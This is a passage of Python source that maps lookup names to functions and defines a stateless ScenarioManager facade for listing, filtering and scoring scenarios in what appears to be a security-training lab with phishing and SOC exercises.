    "all": get_all_scenarios,
    "get": get_scenario,
    "categories": get_categories,
    "by_category": get_scenarios_by_category,
    "evaluate": evaluate_answer,
    "filter": get_scenarios,
    "phishing": get_phishing_scenarios,
    "soc": get_soc_scenarios,
}


# Backward-compatible class-based facade (used by services/__init__.py)
class ScenarioManager:
    """OOP facade over the scenario repository."""

    @staticmethod
    def list_scenarios(category: str = "All Labs") -> List[Dict[str, Any]]:
        return get_scenarios_by_category(category)

    @staticmethod
    def get(scenario_id: str) -> Optional[Dict[str, Any]]:
        return get_scenario(scenario_id)

    @staticmethod
    def categories() -> List[str]:
        return get_categories()

    @staticmethod
    def evaluate(scenario_id: str, selected_index: int) -> Dict[str, Any]:
        return evaluate_answer(scenario_id, selected_index)

    @staticmethod
    def by_lab(lab: str = "all", category: str = "All Labs") -> List[Dict[str, Any]]:
        return get_scenarios(lab=lab, category=category)


def get_scenario_manager() -> ScenarioManager:
    """Return the ScenarioManager facade (stateless)."""
    return ScenarioManager
